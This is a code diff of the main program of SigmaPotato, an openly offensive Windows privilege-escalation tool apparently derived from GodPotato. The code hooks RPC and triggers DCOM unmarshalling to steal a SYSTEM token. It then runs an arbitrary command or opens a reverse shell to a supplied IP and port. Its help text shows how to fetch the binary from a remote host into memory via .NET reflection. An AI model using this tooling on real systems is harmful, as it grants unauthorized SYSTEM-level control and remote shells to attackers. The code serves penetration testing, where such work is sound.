@@ -1,27 +1,25 @@
 ﻿using System;
 using System.IO;
-using SigmaPotato.NativeAPI;
-using System.Security.Principal;
 using System.Reflection;
-using SharpToken;
 using System.Diagnostics;
+using System.Security.Principal;
+using SharpToken;
+using NativeAPI;
 
-namespace SigmaPotato
+public class SigmaPotato
 {
-    public class Program
+    public static void Main(string[] args)
     {
-       
-        public static void Main(string[] args)
-        {
-            TextWriter ConsoleWriter = Console.Out;
-            
-            // Detect AssemblyName and adjust help message accordingly
-            Assembly assembly = Assembly.GetExecutingAssembly();
-            AssemblyName assemblyName = assembly.GetName();
-            string assemblyString = assemblyName.Name;
-            string helpMessage = null;
 
-            string banner = @"
+        TextWriter ConsoleWriter = Console.Out;
+        Assembly assembly = Assembly.GetExecutingAssembly();
+        AssemblyName assemblyName = assembly.GetName();
+        string assemblyString = assemblyName.Name;
+        string helpMessage = null;
+
+
+        // Build Help Message
+        string banner = @"
  ____  _                       ____       _        _                   
 / ___|(_) __ _ _ __ ___   __ _|  _ \ ___ | |_ __ _| |_ ___  
 \___ \| |/ _` | '_ ` _ \ / _` | |_) / _ \| __/ _` | __/ _ \ 
@@ -29,7 +27,7 @@ namespace SigmaPotato
 |____/|_|\__, |_| |_| |_|\__,_|_|   \___/ \__\__,_|\__\___/ 
          |___/";
 
-            string bannerCore = @"
+        string bannerCore = @"
  ____  _                       ____       _        _         |   ____               
 / ___|(_) __ _ _ __ ___   __ _|  _ \ ___ | |_ __ _| |_ ___   |  / ___|___  _ __ ___ 
 \___ \| |/ _` | '_ ` _ \ / _` | |_) / _ \| __/ _` | __/ _ \  | | |   / _ \| '__/ _ \
@@ -37,121 +35,143 @@ namespace SigmaPotato
 |____/|_|\__, |_| |_| |_|\__,_|_|   \___/ \__\__,_|\__\___/  |  \____\___/|_|  \___|
          |___/                                               |";
 
-            string helpBody = @"
+        string helpBody = @"
 Author: Tyler McCann (@tylerdotrar)
-Arbitary Version Number: v1.0.0
+Arbitary Version Number: v1.2.5
 
-------------------------------
-Usage from Disk via the Binary
-------------------------------
----                    
+.--------------------------------.
+| Usage from Disk via the Binary |
+'--------------------------------'
+        
 [+]  Command Execution :  ./SigmaPotato.exe <command>
 [+]  Reverse Shell     :  ./SigmaPotato.exe --revshell <ip_addr> <port>
----                    
+                
 
--------------------------------------
-Usage from Memory via .NET Reflection
--------------------------------------
+.---------------------------------------.
+| Usage from Memory via .NET Reflection |
+'---------------------------------------'
+
+[+]  Load Locally        :  [System.Reflection.Assembly]::LoadFile(""$PWD/SigmaPotato.exe"")
+[+]  Load Remotely       :  [System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData(""http(s)://<ip_addr>/SigmaPotato.exe""))
 ---                    
-[+]  Load Locally      :  [System.Reflection.Assembly]::LoadFile(""$PWD/SigmaPotato.exe"")
-[+]  Load Remotely     :  [System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData(""http(s)://<ip_addr>/SigmaPotato.exe""))
----                    
-[+]  Command Execution :  [SigmaPotato.Program]::Main(""<command>"")
-[+]  Reverse Shell     :  [SigmaPotato.Program]::Main(@(""--revshell"",""<ip_addr>"",""<port>""))
----
+[+]  Command Execution   :  [SigmaPotato]::Main(""<command>"")
+[+]  Reverse Shell       :  [SigmaPotato]::Main(@(""--revshell"",""<ip_addr>"",""<port>""))
 ";
 
-            // Detect AssemblyName and adjust help message accordingly.
-            if (assemblyString == "SigmaPotatoCore")
-            {
-                helpMessage = bannerCore + Environment.NewLine + helpBody;
-                helpMessage = helpMessage.Replace("SigmaPotato", "SigmaPotatoCore");
-            }
-            else
-            {
-                helpMessage = banner + Environment.NewLine + helpBody;
-            }
+
+        // Detect AssemblyName and adjust help message accordingly.
+        if (assemblyString == "SigmaPotatoCore")
+        {
+            helpMessage = bannerCore + Environment.NewLine + helpBody;
+        }
+        else
+        {
+            helpMessage = banner + Environment.NewLine + helpBody;
+        }
 
 
-            // General Error Correction
-            if (args.Length == 0 || string.IsNullOrEmpty(args[0]))
+        // General Error Correction
+        if (args.Length == 0 || string.IsNullOrEmpty(args[0]))
+        {
+            ConsoleWriter.WriteLine("[-] No arguments detected.  Use '--help' for usage information.\n");
+            return;
+        }
+        else if (args[0] != "--revshell" && args.Length > 1)
+        {
+            ConsoleWriter.WriteLine("[-] Unexpected arguments detected.  Use '--help' for usage information.");
+            ConsoleWriter.WriteLine(" o  (Hint: you might need to wrap your arguments in quotations)\n");
+
+            return;
+        }
+        else if (args[0] == "--revshell" && args.Length < 3)
+        {
+            ConsoleWriter.WriteLine("[-] Reverse shell functionality is missing arguments.  Use '--help' for usage information.");
+            ConsoleWriter.WriteLine(" o  (Hint: you need to specify an IP address and port)\n");
+            return;
+        }
+
+
+        // Return help message
+        else if (args[0] == "--help")
+        {
+            ConsoleWriter.WriteLine(helpMessage);
+            return;
+        }
+
+
+        // Establish input variables.
+        string commandLine = args[0];
+        string IpAddress = null;
+        int Port = 0;
+
+
+        if (commandLine == "--revshell")
+        {
+            if (args.Length < 3)
             {
-                ConsoleWriter.WriteLine("[-] No arguments detected.  Use '--help' for usage information.\n");
+                ConsoleWriter.WriteLine("[-] Reverse shell functionality is missing arguments.  Use '--help' for usage information.");
+                ConsoleWriter.WriteLine(" o  (Hint: you need to specify an IP address and port)\n");
                 return;
             }
-            else if (args[0] != "--revshell" && args.Length > 1)
-            {
-                ConsoleWriter.WriteLine("[-] Unexpected arguments detected.  Use '--help' for usage information.");
-                ConsoleWriter.WriteLine("    o (Hint: You might need to wrap your arguments in quotations.)\n");
-                return;
-            }
 
-
-            // Return help message
-            else if (args[0] == "--help")
-            {
-                ConsoleWriter.WriteLine(helpMessage);
-                return;
-            }
-
-
-            // Establish input variables.
-            string commandLine = args[0];
-            string IpAddress = null;
-            int Port = 0;
-
-            if (commandLine == "--revshell")
-            {
-                if (args.Length < 3)
-                {
-                    ConsoleWriter.WriteLine("[-] Reverse shell functionality is missing arguments.  Use '--help' for usage information.");
-                    ConsoleWriter.WriteLine("    o (Hint: You need to specify an IP address and port.)\n");
-                    return;
-                }
-
-                IpAddress = args[1];
-                Port = int.Parse(args[2]);
-            }
+            IpAddress = args[1];
+            Port = int.Parse(args[2]);
+        }
 
             
-            // Start Esoteric Tomfoolery
+        // Start Esoteric Tomfoolery
+        try
+        {
+            SigmaPotatoContext SigmaPotatoContext = new SigmaPotatoContext(ConsoleWriter, Guid.NewGuid().ToString());
+            SigmaPotatoContext.HookRPC();
+
+            ConsoleWriter.WriteLine("[+] Starting Pipe Server...");
+            SigmaPotatoContext.Start();
+
+            SigmaPotatoUnmarshalTrigger unmarshalTrigger = new SigmaPotatoUnmarshalTrigger(SigmaPotatoContext);
+
             try
             {
-                GodPotatoNetContext GodPotatoNetContext = new GodPotatoNetContext(ConsoleWriter, Guid.NewGuid().ToString());
-                GodPotatoNetContext.HookRPC();
-
-                ConsoleWriter.WriteLine("[+] Starting Pipe Server...");
-                GodPotatoNetContext.Start();
-
-                GodPotatoNetUnmarshalTrigger unmarshalTrigger = new GodPotatoNetUnmarshalTrigger(GodPotatoNetContext);
-
-                try
-                {
-                    int hr = unmarshalTrigger.Trigger();
-                }
-                catch (Exception e)
-                {
-                    ConsoleWriter.WriteLine(e);
-                }
-                
-                // Attempt to execute command in an elevated security context
-                WindowsIdentity systemIdentity = GodPotatoNetContext.GetToken();
-                if (systemIdentity != null)
-                { 
-					TokenuUils.createProcessReadOut(ConsoleWriter, systemIdentity.Token, commandLine, IpAddress, Port);
-                }
-                else
-                {
-                    ConsoleWriter.WriteLine("[-] Failed to impersonate security context token.");
-                }
-
-                GodPotatoNetContext.Restore();
-                GodPotatoNetContext.Stop();
+                int hr = unmarshalTrigger.Trigger();
             }
             catch (Exception e)
             {
-                ConsoleWriter.WriteLine($"[-] Error! Exception: {e.Message}");
+                ConsoleWriter.WriteLine(e);
             }
+            
+
+            // Attempt to execute command in an elevated security context
+            WindowsIdentity systemIdentity = SigmaPotatoContext.GetToken();
+            if (systemIdentity != null)
+            {
+                string ProcessOutput = null;
+
+				TokenUtils.createProcessReadOut(out ProcessOutput, ConsoleWriter, systemIdentity.Token, commandLine, IpAddress, Port);
+
+                // WIP: This isn't working with .NET Reflection; needs troubleshooting.
+                //ConsoleWriter.WriteLine($"Exported Process Output: {ProcessOutput}");
+
+                // Store process output in an environment variable that can be interacted with in PowerShell if using Reflection
+                if (ProcessOutput != null)
+                {
+                    Environment.SetEnvironmentVariable("SigmaOutput", ProcessOutput); // Variable Name: $env:SigmaOutput
+                }
+                else
+                {
+                    Environment.SetEnvironmentVariable("SigmaOutput", "null"); // Variable Name: $env:SigmaOutput
+                }
+            }
+            else
+            {
+                ConsoleWriter.WriteLine("[-] Failed to impersonate security context token.");
+            }
+
+            SigmaPotatoContext.Restore();
+            SigmaPotatoContext.Stop();
+        }
+        catch (Exception e)
+        {
+            ConsoleWriter.WriteLine($"[-] Error! Exception: {e.Message}");
         }
     }
 }
